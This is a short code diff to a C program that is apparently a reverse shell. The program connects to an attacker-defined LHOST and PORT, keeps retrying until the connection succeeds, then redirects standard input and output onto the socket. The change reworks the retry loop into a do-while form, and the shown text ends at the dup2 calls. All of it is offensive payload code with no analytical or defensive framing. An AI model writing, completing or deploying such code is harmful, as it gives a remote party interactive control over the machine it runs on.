@@ -5,7 +5,7 @@
 
 int main(void){
   
-  int connection_established = 1;
+  int connection_established;
   char ip[] = LHOST;
   int port = PORT;
 
@@ -16,9 +16,10 @@ int main(void){
   sa.sin_addr.s_addr = inet_addr(ip);
 
   int sockt =  socket(AF_INET, SOCK_STREAM, 0);
-  while(connection_established != 0){
+  do{
     connection_established = connect(sockt, (struct sockaddr *)&sa, sizeof(sa)); 
   }
+  while(connection_established != 0);
 
 	dup2(sockt, 0);
 	dup2(sockt, 1);
